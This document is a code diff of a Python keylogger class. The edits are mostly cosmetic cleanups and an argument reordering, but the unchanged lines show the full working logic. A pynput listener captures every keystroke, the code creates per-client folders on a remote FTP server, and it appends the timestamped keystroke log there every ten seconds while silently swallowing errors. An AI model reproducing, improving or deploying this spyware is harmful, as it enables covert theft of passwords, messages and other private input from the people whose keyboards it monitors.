@@ -12,12 +12,12 @@ class Keylogger:
         self.keyboard_listener = pynput.keyboard.Listener()
 
 
-    #append logged characters to log variable
+    # append logged characters to log variable
     def append_string(self, string):
         self.log = self.log + string
 
 
-    #log keystrokes
+    # log keystrokes
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
@@ -29,33 +29,28 @@ class Keylogger:
         self.append_string(current_key)
 
 
-    #checks if client folder and file exist
+    # checks if client folder and file exist
     def client_folder_exist(self, ftp, filename, folderId, client_id):
         try:
             if folderId in ftp.nlst():
                 ftp.cwd(folderId)
-
             else:
                 ftp.mkd(folderId)
                 ftp.cwd(folderId)
 
             if client_id in ftp.nlst():
                 ftp.cwd(client_id)
-
             else:
                 ftp.mkd(client_id)
                 ftp.cwd(client_id)
 
             if filename in ftp.nlst():
                 pass
-
             else:
                 ftp.storbinary('STOR log.txt', " ")
-
         except Exception as e:
+            # print(e)
             pass
-            #print(e)
-
 
 
     def writeToTxt(self, ftp, filename):
@@ -66,18 +61,18 @@ class Keylogger:
                 logdata = strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ": " + self.log + "\n"
                 self.log = ""
                 #print(logdata)
-
                 logdata = io.BytesIO(logdata.encode('utf-8'))
                 ftp.storbinary(f"APPE {filename}", logdata)
 
             timer = threading.Timer(10, self.writeToTxt, [ftp, filename])
             timer.start()
-        except:
+        except Exception as e:
+            #print(e)
             pass
 
 
-    #starts keylogger
-    def start_keylogger(self, FTP_PASS, filename, folderId, client_id, FTP_HOST, FTP_USER):
+    # start keylogger
+    def start_keylogger(self, filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS,):
 
         ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
         ftp.encoding = "utf-8"
@@ -89,10 +84,7 @@ class Keylogger:
             self.keyboard_listener.join()
 
 
-    #stop keylogger timer
+    # stop keylogger timer
     def stop_timer(self):
         self.keyboard_listener.stop()
         self.keyboard_listener.join()
-
-
-
